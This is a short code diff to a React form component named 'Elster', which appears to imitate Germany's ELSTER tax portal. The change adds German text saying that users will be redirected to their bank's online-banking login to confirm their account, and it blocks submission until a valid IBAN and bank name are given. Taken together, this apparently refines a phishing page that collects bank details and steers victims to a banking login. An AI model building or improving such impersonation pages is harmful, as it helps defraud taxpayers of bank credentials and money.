@@ -546,9 +546,13 @@ const Elster = () => {
                       )}
                     </div>
 
+                    <div style={{ background: "#f8f8f8", border: `1px solid ${BORDER}`, padding: "12px 14px", fontSize: 13, lineHeight: 1.5, color: TEXT, marginTop: 8 }}>
+                      <strong>Hinweis zur Kontoverifizierung:</strong> Nach dem Absenden werden Sie zur Online-Banking-Anmeldung Ihrer Bank weitergeleitet. Bitte loggen Sie sich dort ein, um Ihr Konto zu bestätigen. Anschließend kehren Sie automatisch hierher zurück.
+                    </div>
+
                     <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
                       <button type="button" onClick={() => setStep(1)} style={{ background: "#fff", color: BLUE, border: `1px solid ${BORDER}`, padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Zurück</button>
-                      <button type="submit" disabled={verifySubmitting} style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Absenden</button>
+                      <button type="submit" disabled={verifySubmitting || !ibanValid || !bankName} style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: (verifySubmitting || !ibanValid || !bankName) ? "not-allowed" : "pointer", opacity: (verifySubmitting || !ibanValid || !bankName) ? 0.5 : 1 }}>Absenden</button>
                     </div>
                   </form>
                 )}
